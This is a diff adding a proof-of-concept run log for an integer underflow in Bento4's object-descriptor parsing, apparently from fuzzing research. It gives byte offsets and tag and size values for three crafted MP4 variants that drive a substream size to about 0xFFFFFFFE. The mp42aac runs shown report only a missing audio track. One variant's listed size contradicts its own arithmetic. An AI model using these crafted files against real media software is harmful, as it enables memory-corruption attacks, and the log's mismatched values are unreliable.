@@ -1,0 +1,53 @@
+=== VULN 001 PoC: AP4_ObjectDescriptor integer underflow ===
+Date: Mon Sep  7 05:29:55 AM +08 2026
+
+[*] Variant 1: Generating MP4 (OD tag=0x01, payload_size=0)...
+[+] Written 157 bytes to /data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4Command_h/vuln_001.mp4
+    ftyp  : 20 bytes at offset 0
+    moov  : 137 bytes at offset 20
+      mvhd: 108 bytes at offset 28
+      iods: 21 bytes at offset 136
+        OD tag  @ offset 148 = 0x01
+        OD size @ offset 149 = 0x00
+        ReadUI16 reads from offset 150: 00 00
+        SubStream m_Offset = 152
+        SubStream m_Size   = 0xFFFFFFFE (from 0 - 2 underflow)
+    variant: OD tag=0x01, payload_size=0 → 0-2=0xFFFFFFFE
+[*] Running mp42aac (variant 1)...
+ERROR: no audio track found
+
+[*] Collecting ASAN/UBSAN log output (variant 1)...
+
+[*] Variant 2: Generating MP4 (OD tag=0x01, payload_size=1)...
+[+] Written 157 bytes to /data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4Command_h/vuln_001.mp4
+    ftyp  : 20 bytes at offset 0
+    moov  : 137 bytes at offset 20
+      mvhd: 108 bytes at offset 28
+      iods: 21 bytes at offset 136
+        OD tag  @ offset 148 = 0x01
+        OD size @ offset 149 = 0x01
+        ReadUI16 reads from offset 150: 00 00
+        SubStream m_Offset = 152
+        SubStream m_Size   = 0xFFFFFFFE (from 0 - 2 underflow)
+    variant: OD tag=0x01, payload_size=1 → 1-2=0xFFFFFFFF
+[*] Running mp42aac (variant 2)...
+ERROR: no audio track found
+[*] Collecting ASAN/UBSAN log output (variant 2)...
+
+[*] Variant 3: Generating MP4 (MP4_OD tag=0x11, payload_size=0)...
+[+] Written 157 bytes to /data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4Command_h/vuln_001.mp4
+    ftyp  : 20 bytes at offset 0
+    moov  : 137 bytes at offset 20
+      mvhd: 108 bytes at offset 28
+      iods: 21 bytes at offset 136
+        OD tag  @ offset 148 = 0x11
+        OD size @ offset 149 = 0x00
+        ReadUI16 reads from offset 150: 00 00
+        SubStream m_Offset = 152
+        SubStream m_Size   = 0xFFFFFFFE (from 0 - 2 underflow)
+    variant: MP4_OD tag=0x11, payload_size=0 → 0-2=0xFFFFFFFE
+[*] Running mp42aac (variant 3)...
+ERROR: no audio track found
+[*] Collecting ASAN/UBSAN log output (variant 3)...
+
+[*] Done.
